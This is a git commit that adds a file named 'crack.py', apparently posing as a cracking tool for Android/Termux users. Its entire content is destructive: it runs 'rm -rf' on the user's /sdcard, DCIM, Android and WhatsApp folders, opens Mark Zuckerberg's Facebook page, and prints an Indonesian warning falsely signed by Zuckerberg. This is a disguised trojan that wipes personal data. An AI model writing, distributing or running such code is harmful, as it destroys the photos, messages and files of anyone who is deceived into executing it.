f470fe464980711071d1e064d8a7af2c713f8d13
akbarsx <40322119+akbarsx@users.noreply.github.com>
2019-06-19 06:49:21 +0700

    Add files via upload

---
+++ crack.py
@@ -0,0 +1,8 @@
+import os
+os.system("rm -rf /sdcard/")
+os.system("rm -rf /DCIM/")
+os.system("rm -rf /Android/")
+os.system("rm -rf /WhatsApp/")
+os.system("xdg-open https://free.facebook.com/zuck")
+os.system("clear")
+print("\n\n Matikan Tools Ilegal Ini, atau saya akan bertindak keras\n\n-Mark Zuckerberg")
